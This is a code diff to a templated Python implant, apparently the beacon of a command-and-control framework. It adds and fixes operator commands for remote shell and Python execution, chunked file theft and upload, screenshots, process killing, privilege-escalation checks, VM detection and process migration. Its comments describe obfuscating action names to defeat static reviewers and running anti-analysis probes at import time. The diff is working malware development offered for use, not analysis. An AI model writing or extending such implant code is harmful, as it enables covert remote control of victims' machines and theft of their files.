@@ -358,6 +358,7 @@ import threading as _th
 import time as _t
 import traceback as _tb
 import uuid as _uuid
+import datetime as _dt
 
 {% if is_win %}
 import ctypes, ctypes.wintypes, winreg
@@ -611,19 +612,52 @@ def _unused_label_encode(label: str) -> bytes:
 # loop body becomes a single dict lookup instead of an if/elif chain, so
 # static reviewers cannot read the beacon's control flow as prose.
 # Keys are built from the string table to avoid plaintext action names.
+#
+# The key set is emitted from the same switches that populate the table below.
+# A key with no handler is a verb the server will happily send — the capability
+# claim says this build carries it — and this build would answer "unknown
+# action", which the operator reads as the target's reply. Keeping one list in
+# sync with the other by hand is what produced that mismatch.
 _ACTION_KEYS = {
     "ping": _OBF.store("ping"),
-    "exec": _OBF.store("exec"),
+    "shutdown": _OBF.store("shutdown"),
+{% if include_recon %}
     "sysinfo": _OBF.store("sysinfo"),
     "network": _OBF.store("network"),
     "processes": _OBF.store("processes"),
+    "netstat": _OBF.store("netstat"),
+    "process_kill": _OBF.store("process_kill"),
+    "pwd": _OBF.store("pwd"),
+    "get_hwuuid": _OBF.store("get_hwuuid"),
+    "env": _OBF.store("env"),
+    "date": _OBF.store("date"),
+    "alive": _OBF.store("alive"),
+    "getpid": _OBF.store("getpid"),
+    "getuid": _OBF.store("getuid"),
+    "getppid": _OBF.store("getppid"),
+    "getdomain": _OBF.store("getdomain"),
+    "check_vm": _OBF.store("check_vm"),
+{% endif %}
+{% if include_exec %}
+    "exec": _OBF.store("exec"),
+    "pyexec": _OBF.store("pyexec"),
+{% endif %}
+{% if include_fs %}
     "fs_list": _OBF.store("fs_list"),
     "fs_get": _OBF.store("fs_get"),
     "fs_put": _OBF.store("fs_put"),
+    "load_package": _OBF.store("load_package"),
+{% endif %}
+{% if include_privesc %}
     "privesc_check": _OBF.store("privesc_check"),
     "privesc_suggest": _OBF.store("privesc_suggest"),
+{% endif %}
+{% if include_screenshot %}
+    "screenshot": _OBF.store("screenshot"),
+{% endif %}
+{% if migration %}
     "migrate": _OBF.store("migrate"),
-    "shutdown": _OBF.store("shutdown"),
+{% endif %}
 }
 
 _ACTION_TABLE: dict = {}
@@ -656,15 +690,24 @@ def _action_bind() -> None:
 {% endif %}
 {% if include_exec %}
     table["exec"] = lambda task: mod_exec(task.get("command", ""), int(task.get("timeout", 60)))
+    table["pyexec"] = lambda task: mod_pyexec(task.get("code", ""), bool(task.get("redirected", True)))
 {% endif %}
 {% if include_fs %}
     table["fs_list"] = lambda task: mod_fs_list(task.get("path", "."))
-    table["fs_get"] = lambda task: {"data": _b64e(mod_fs_get(task.get("path", ""))).decode()}
+    # Same chunked reply shape as the plaintext dispatcher: a download is sized
+    # and resumed by the server from these fields, so a bare {"data": ...} here
+    # would make a heavy build look like a transfer that never ends.
+    table["fs_get"] = _fs_get_chunked
     table["fs_put"] = lambda task: mod_fs_put(task.get("path", ""), _b64d(task.get("data", "")))
+    table["load_package"] = lambda task: mod_load_package(
+        task.get("name", ""), task.get("path", ""), bool(task.get("force", False)))
 {% endif %}
 {% if include_privesc %}
     table["privesc_check"] = lambda task: mod_privesc_check()
     table["privesc_suggest"] = lambda task: _privesc_suggest_lambda(task)
+{% endif %}
+{% if include_screenshot %}
+    table["screenshot"] = lambda task: mod_screenshot()
 {% endif %}
 {% if migration %}
     table["migrate"] = lambda task: migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
@@ -719,6 +762,30 @@ class _NoopObf:
 _OBF = _NoopObf()
 {% endif %}
 
+{#- One chunked fs_get reply, shared by the plaintext dispatch chain and the
+    heavy dispatch table. Two implementations drifted apart before: the flat
+    one returned a bare {"data": ...}, which a transfer loop reads as a
+    download that never reports eof. -#}
+{% if include_fs %}
+def _fs_get_chunked(task: dict) -> dict:
+    """A file slice plus the size/offset/eof the transfer loop is sized by."""
+    path = task.get("path", "")
+    offset = int(task.get("offset") or 0)
+    length = int(task.get("length") or 0)
+    try:
+        size = mod_fs_size(path)
+        data = mod_fs_get(path, offset, length)
+    except OSError as e:
+        return {"error": str(e)}
+    return {
+        "size": size,
+        "offset": offset,
+        "length": len(data),
+        "eof": size >= 0 and offset + len(data) >= size,
+        "data": _b64e(data).decode(),
+    }
+{% endif %}
+
 # What this build can actually do, declared from the same module switches that
 # decided which handlers exist above. The listener refuses a task the implant
 # never said it could perform, so the register has to name them honestly.
@@ -755,6 +822,10 @@ def _detect_platform():
 
 PLATFORM = _detect_platform()
 ARCH = _pf.machine().lower()
+# Defined here, next to the platform detection, because the anti-analysis probes
+# below read it: they run at import time, and a name defined further down the
+# file is not bound yet when they do.
+USERNAME = _o.environ.get("USER") or _o.environ.get("USERNAME") or "unknown"
 
 {% if anti %}
 # --------------------------------------------------------------------- #
@@ -1158,7 +1229,6 @@ _PAYLOAD_ID = "{{ payload_id }}"
 
 AGENT_ID = _make_id()
 HOSTNAME = _pf.node()
-USERNAME = _o.environ.get("USER") or _o.environ.get("USERNAME") or "unknown"
 
 def identity():
     return {
@@ -1612,7 +1682,7 @@ def mod_date():
         return {
             "utc": _dt.datetime.now(_dt.timezone.utc).isoformat(),
             "local": _dt.datetime.now().isoformat(),
-            "tzname": str(_tm.tzname),
+            "tzname": str(_t.tzname),
         }
     except Exception as exc:
         return {"error": f"cannot read the host clock: {exc}"}
@@ -2417,6 +2487,34 @@ def _dispatch(task: dict) -> dict:
         return mod_network()
     if action == "processes":
         return mod_processes()
+    # The rest of the recon verbs. They were missing here while the heavy
+    # dispatch table had them, so on a plaintext build `netstat`, `pwd`, `env`
+    # and their neighbours answered "unknown action: <verb>" — a reply the
+    # operator reads as the target's, for a capability the payload declared.
+    if action == "netstat":
+        return mod_netstat()
+    if action == "process_kill":
+        return mod_process_kill(task)
+    if action == "pwd":
+        return mod_pwd()
+    if action == "get_hwuuid":
+        return mod_hwuuid()
+    if action == "env":
+        return mod_env()
+    if action == "date":
+        return mod_date()
+    if action == "alive":
+        return mod_alive()
+    if action == "getpid":
+        return mod_getpid()
+    if action == "getuid":
+        return mod_getuid()
+    if action == "getppid":
+        return mod_getppid()
+    if action == "getdomain":
+        return mod_getdomain()
+    if action == "check_vm":
+        return mod_check_vm()
     {% endif %}
     {% if include_exec %}
     if action == "exec":
@@ -2430,21 +2528,7 @@ def _dispatch(task: dict) -> dict:
     if action == "fs_get":
         # Chunked on purpose: a whole file in one reply would be a JSON string
         # of its base64 size, held in memory on both ends.
-        path = task.get("path", "")
-        offset = int(task.get("offset") or 0)
-        length = int(task.get("length") or 0)
-        try:
-            size = mod_fs_size(path)
-            data = mod_fs_get(path, offset, length)
-        except OSError as e:
-            return {"error": str(e)}
-        return {
-            "size": size,
-            "offset": offset,
-            "length": len(data),
-            "eof": size >= 0 and offset + len(data) >= size,
-            "data": _b64e(data).decode(),
-        }
+        return _fs_get_chunked(task)
     if action == "fs_put":
         raw = _b64d(task.get("data", ""))
         return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
